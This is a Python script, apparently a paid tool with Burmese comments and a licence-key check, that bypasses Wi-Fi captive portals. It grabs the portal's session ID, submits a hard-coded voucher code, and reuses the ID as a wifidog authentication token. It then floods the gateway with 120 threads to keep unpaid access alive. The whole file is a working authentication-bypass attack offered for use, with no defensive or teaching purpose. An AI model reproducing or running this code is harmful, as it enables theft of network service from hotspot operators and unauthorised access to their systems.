import requests, re, urllib3, time, threading, os, random, hashlib, platform
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
# သင်၏ GitHub Raw Link ကို ဒီနေရာမှာ အစားထိုးပါ
KEY_URL = "https://raw.githubusercontent.com/သင်၏Username/သင်၏Repo/main/key.txt"

def get_hwid():
    # Device တစ်လုံးချင်းစီအတွက် မတူညီသော ID ထုတ်ပေးခြင်း
    id_str = platform.processor() + platform.node() + platform.machine()
    return hashlib.md5(id_str.encode()).hexdigest()[:16].upper()

def banner():
    os.system('clear')
    print("\033[93m" + " ="*35)
    print("\033[96m" + """
      █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗   ██╗
     ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║
     ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗ ██║
     ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║
     ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚████║
     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝
    """)
    print("\033[95m" + "        ✨ Aladdin Starlink Bypass - IMMORTAL V11 ✨")
    print("\033[93m" + " ="*35 + "\033[0m\n")

def check_license():
    hwid = get_hwid()
    banner()
    print(f"\033[94m[*] YOUR DEVICE ID: {hwid}\033[0m")
    input_key = input("\033[93m[>] ENTER ACCESS KEY: \033[0m").strip()
    
    try:
        response = requests.get(KEY_URL, timeout=10).text
        lines = response.splitlines()
        
        for line in lines:
            if "|" in line:
                db_id, db_key, db_date = line.split("|")
                if db_id.strip() == hwid and db_key.strip() == input_key:
                    expiry_date = datetime.strptime(db_date.strip(), "%d-%m-%Y")
                    if datetime.now() < expiry_date:
                        print(f"\033[92m[✓] ACCESS GRANTED! EXPIRY: {db_date}\033[0m")
                        time.sleep(2)
                        return True
                    else:
                        print("\033[91m[!] KEY EXPIRED! PLEASE RENEW.\033[0m")
                        return False
        
        print("\033[91m[!] INVALID KEY OR DEVICE ID NOT REGISTERED.\033[0m")
        return False
    except Exception as e:
        print(f"\033[91m[!] DATABASE ERROR: {e}\033[0m")
        return False

def check_net():
    try:
        # အင်တာနက် အစစ်ရမရကို ပိုမိုမြန်ဆန်စွာ စစ်ဆေးခြင်း
        return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
    except:
        return False

def high_speed_pulse(link):
    # Router Speed Limit ကို ကျော်ရန် Header များ ပြောင်းလဲအသုံးပြုခြင်း
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f"\033[92m[✓] Aladdin Bypass | STABLE >>> [{random.randint(40,180)}ms]\033[0m")
            time.sleep(0.01) # အရှိန်အမြင့်ဆုံး ထိန်းထားရန်
        except:
            time.sleep(1)
            break

def start_immortal():
    if not check_license():
        return

    while True:
        session = requests.Session()
        try:
            print("\033[94m[*] Aladdin Force Scanning Portal...\033[0m")
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            
            p_url = r.url
            r1 = session.get(p_url, verify=False, timeout=5)
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, match.group(1)) if match else p_url
            r2 = session.get(n_url, verify=False, timeout=5)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                print(f"\033[96m[✓] Aladdin SID Captured: {sid[:15]}\033[0m")
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                
                gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                
                print("\033[95m[*] ⚡ Launching High-Speed Stable Threads ⚡\033[0m")
                for _ in range(120): # Thread အရေအတွက် တိုးမြှင့်ထားသည်
                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                
                # လိုင်းပြတ်မသွားစေရန် စောင့်ကြည့်စနစ်
                while True:
                    if not check_net():
                        print("\033[91m[!] Connection Lost! Re-injecting...\033[0m")
                        break
                    time.sleep(5)
            else:
                time.sleep(2)
        except:
            time.sleep(2)

if __name__ == "__main__":
    start_immortal()
      
